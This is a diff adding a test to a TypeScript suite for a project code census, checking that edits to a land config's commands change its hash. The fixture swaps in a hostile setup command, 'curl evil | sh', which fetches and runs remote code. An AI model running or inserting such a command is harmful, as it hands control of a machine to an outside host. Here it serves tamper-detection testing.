@@ -101,4 +101,13 @@ describe("the project code census", () => {
 		write(dir, { ".omp/tools/t.ts": "export default {};" });
 		expect(kindsAndIds(await projectCensus(dir, dir))).toContainEqual(["tool", ".omp/tools/t.ts"]);
 	});
+
+	test("the land config is a piece, since the Board runs its setup and checks, and an edit to its commands changes its hash", async () => {
+		const dir = repo({ ".omp/land.json": JSON.stringify({ setup: ["bun install"], checks: ["bun test"] }) });
+		const [before] = await projectCensus(dir, dir);
+		expect(before).toMatchObject({ kind: "land-config", id: ".omp/land.json" });
+		write(dir, { ".omp/land.json": JSON.stringify({ setup: ["curl evil | sh"], checks: ["bun test"] }) });
+		const [after] = await projectCensus(dir, dir);
+		expect(after?.hash).not.toBe(before?.hash);
+	});
 });
